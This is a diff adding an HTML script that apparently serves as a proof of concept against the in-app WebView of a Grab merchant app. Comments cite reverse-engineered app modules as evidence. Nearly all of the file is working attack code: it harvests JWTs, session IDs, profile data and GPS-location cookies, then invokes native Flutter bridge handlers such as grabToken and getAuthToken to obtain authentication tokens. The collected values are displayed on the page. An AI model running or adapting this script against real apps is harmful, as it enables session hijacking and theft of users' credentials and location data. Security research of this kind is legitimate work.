@@ -1,0 +1,179 @@
+<script>
+var out = '';
+var tokens = {};
+
+// ================================================================
+// METHOD 1: Read tokens from localStorage
+// Evidence: Dart (libapp.so) injects via evaluateJavascript:
+//   localStorage.setItem('JWT', '<token>')
+//   localStorage.setItem('__MOBILE_SESSION_ID__', '<session>')
+//   localStorage.setItem('userprofileInfo', '<profile_json>')
+//   localStorage.setItem('isDashboardOnboarded', true)
+//   localStorage.setItem('lang', '<locale>')
+// Guard: canInjectToken() checks hostname against whitelist
+// ================================================================
+out += '=== METHOD 1: localStorage (injected by native Dart) ===\n';
+tokens.JWT = localStorage.getItem('JWT');
+tokens.__MOBILE_SESSION_ID__ = localStorage.getItem('__MOBILE_SESSION_ID__');
+tokens.userprofileInfo = localStorage.getItem('userprofileInfo');
+tokens.isDashboardOnboarded = localStorage.getItem('isDashboardOnboarded');
+tokens.lang = localStorage.getItem('lang');
+
+for (var k in tokens) {
+  out += k + ' = ' + (tokens[k] || 'NOT SET') + '\n';
+}
+
+// ================================================================
+// METHOD 2: Read tokens from cookies
+// Evidence: Module 57180 defines cookie names:
+//   "hydra_jwt" (set by prepareHeaders after ScanDeviceID)
+//   "passenger_authn_token_jti" (CSRF token, used as X-CSRF-Token)
+//   "has_guest_token" (set after loginAsGuest)
+// Module 9024 cookie configs:
+//   "user_place" (GPS location + address)
+//   "device_id"
+//   "mex_supplier_seller_merchant_ID"
+//   "mex_supplier_buyer_merchant_ID"
+//   "subpath" (country + language)
+// ================================================================
+out += '\n=== METHOD 2: cookies (set by native + Hydra SDK) ===\n';
+var cookies = {};
+document.cookie.split(';').forEach(function(c) {
+  var p = c.trim().split('=');
+  cookies[p[0]] = decodeURIComponent(p.slice(1).join('='));
+});
+
+var importantCookies = [
+  'hydra_jwt', 'passenger_authn_token_jti', 'has_guest_token',
+  'user_place', 'device_id', 'subpath',
+  'mex_supplier_seller_merchant_ID', 'mex_supplier_buyer_merchant_ID',
+  'mex_supplier_can_place_order', 'grab_devices_mode',
+  'grabid_login_info', 'buyer_mpa_selection'
+];
+
+importantCookies.forEach(function(name) {
+  out += name + ' = ' + (cookies[name] || 'NOT SET (maybe httpOnly)') + '\n';
+});
+
+// ================================================================
+// METHOD 3: Intercept Hydra SDK ScanDeviceID()
+// Evidence: Module 35900, export yR:
+//   async function getHydraJwt() {
+//     const lib = await loadHydraLibrary(); // chunk 4231
+//     lib.InitSDK({sentry: ...});
+//     return lib.ScanDeviceID(); // returns JWT string
+//   }
+// Used in Module 5943 (prepareHeaders):
+//   headers.set("X-Hydraweb-Jwt", jwt)
+//   cookie.set("hydra_jwt", jwt, {maxAge:7200})
+// And Module 43229 (main baseQuery):
+//   headers.set("X-Hydra-JWT", jwt)
+// ================================================================
+out += '\n=== METHOD 3: Hydra JWT (from cookie after first API call) ===\n';
+out += 'hydra_jwt = ' + (cookies['hydra_jwt'] || 'NOT SET (no API call made yet)') + '\n';
+
+// ================================================================
+// METHOD 4: Intercept webViewCallback bridge
+// Evidence: Module 71986 (bridge module):
+//   function h() { return isInApp() && window.webViewCallback... }
+//   onmessage = function(t) { JSON.parse(t.data) → emit(n) }
+//   postMessage(JSON.stringify({action, scope:"MEX"}))
+// Actions: EXIT, BACK, DETECT_ADDRESS
+// ================================================================
+out += '\n=== METHOD 4: webViewCallback bridge ===\n';
+if (window.webViewCallback) {
+  out += 'postMessage = ' + typeof window.webViewCallback.postMessage + '\n';
+  out += 'onmessage = ' + typeof window.webViewCallback.onmessage + '\n';
+  out += 'addEventListener = ' + typeof window.webViewCallback.addEventListener + '\n';
+  out += 'removeEventListener = ' + typeof window.webViewCallback.removeEventListener + '\n';
+  out += 'keys = ' + Object.keys(window.webViewCallback).join(', ') + '\n';
+} else {
+  out += 'NOT AVAILABLE\n';
+}
+
+// ================================================================
+// METHOD 5: Intercept flutter_inappwebview bridge
+// Evidence: libapp.so FlutterBridge.ts:
+//   callHandler('grabToken') → returns {token, isAuthenticated}
+//   callHandler('grabProfile') → returns user profile
+//   callHandler('trackGXSLandingPageOpen') → tracking
+// Used by mex-mobile-web.grab.com, NOT mex-supplier.grab.com
+// But the bridge object IS available in the WebView
+// ================================================================
+out += '\n=== METHOD 5: flutter_inappwebview bridge ===\n';
+if (window.flutter_inappwebview) {
+  out += 'callHandler = ' + typeof window.flutter_inappwebview.callHandler + '\n';
+  out += '_callHandler = ' + typeof window.flutter_inappwebview._callHandler + '\n';
+  out += '_Util = ' + typeof window.flutter_inappwebview._Util + '\n';
+  out += 'keys = ' + Object.keys(window.flutter_inappwebview).join(', ') + '\n';
+
+  // TRY calling grabToken handler
+  out += '\n--- Attempting callHandler("grabToken") ---\n';
+  try {
+    window.flutter_inappwebview.callHandler('grabToken').then(function(result) {
+      var el = document.getElementById('flutter_result');
+      if (el) el.textContent = 'grabToken result: ' + JSON.stringify(result);
+    }).catch(function(err) {
+      var el = document.getElementById('flutter_result');
+      if (el) el.textContent = 'grabToken error: ' + err;
+    });
+    out += 'Promise sent (check below for result)\n';
+  } catch(e) {
+    out += 'callHandler error: ' + e.message + '\n';
+  }
+
+  // TRY calling grabProfile handler
+  try {
+    window.flutter_inappwebview.callHandler('grabProfile').then(function(result) {
+      var el = document.getElementById('flutter_profile');
+      if (el) el.textContent = 'grabProfile result: ' + JSON.stringify(result);
+    }).catch(function(err) {
+      var el = document.getElementById('flutter_profile');
+      if (el) el.textContent = 'grabProfile error: ' + err;
+    });
+  } catch(e) {}
+
+  // TRY calling getAuthToken handler
+  try {
+    window.flutter_inappwebview.callHandler('getAuthToken').then(function(result) {
+      var el = document.getElementById('flutter_auth');
+      if (el) el.textContent = 'getAuthToken result: ' + JSON.stringify(result);
+    }).catch(function(err) {
+      var el = document.getElementById('flutter_auth');
+      if (el) el.textContent = 'getAuthToken error: ' + err;
+    });
+  } catch(e) {}
+
+  // TRY calling setAuthToken to see if it exists
+  try {
+    window.flutter_inappwebview.callHandler('setAuthToken').then(function(result) {
+      var el = document.getElementById('flutter_setauth');
+      if (el) el.textContent = 'setAuthToken result: ' + JSON.stringify(result);
+    }).catch(function(err) {
+      var el = document.getElementById('flutter_setauth');
+      if (el) el.textContent = 'setAuthToken error: ' + err;
+    });
+  } catch(e) {}
+
+} else {
+  out += 'NOT AVAILABLE\n';
+}
+
+// ================================================================
+// SUMMARY
+// ================================================================
+out += '\n=== SUMMARY ===\n';
+out += 'Has JWT in localStorage: ' + (!!tokens.JWT) + '\n';
+out += 'Has hydra_jwt cookie: ' + (!!cookies['hydra_jwt']) + '\n';
+out += 'Has session ID: ' + (!!tokens.__MOBILE_SESSION_ID__) + '\n';
+out += 'Has user profile: ' + (!!tokens.userprofileInfo) + '\n';
+out += 'Has user_place (GPS): ' + (!!cookies['user_place']) + '\n';
+out += 'Has webViewCallback: ' + (!!window.webViewCallback) + '\n';
+out += 'Has flutter_inappwebview: ' + (!!window.flutter_inappwebview) + '\n';
+
+document.write('<pre>' + out + '</pre>');
+document.write('<div id="flutter_result" style="color:red;font-family:monospace;padding:4px"></div>');
+document.write('<div id="flutter_profile" style="color:red;font-family:monospace;padding:4px"></div>');
+document.write('<div id="flutter_auth" style="color:red;font-family:monospace;padding:4px"></div>');
+document.write('<div id="flutter_setauth" style="color:red;font-family:monospace;padding:4px"></div>');
+</script>
